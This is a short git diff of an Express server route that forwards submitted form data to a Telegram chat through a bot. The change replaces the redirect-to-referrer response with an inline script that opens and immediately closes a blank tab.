@@ -54,8 +54,8 @@ app.post('/submit-form', (req, res) => {
     bot.sendMessage('1909671536', message) // Replace 'YOUR_TELEGRAM_CHAT_ID' with the actual chat ID
         .then(() => {
             console.log('Form data sent to Telegram bot successfully');
-            // Send a response to trigger a redirect to the previous page
-            res.json({ redirectTo: req.get('referer') }); // Redirect to the previous page
+            // Send a response to trigger opening a new tab and closing it
+            res.send('<script>window.open("about:blank","_blank").close();</script>');
         })
         .catch((error) => {
             console.error('Error sending form data to Telegram bot:', error.message);
@@ -63,6 +63,7 @@ app.post('/submit-form', (req, res) => {
             res.status(500).send('Error submitting form');
         });
 });
+
 
 // Start the server
 app.listen(port, () => {
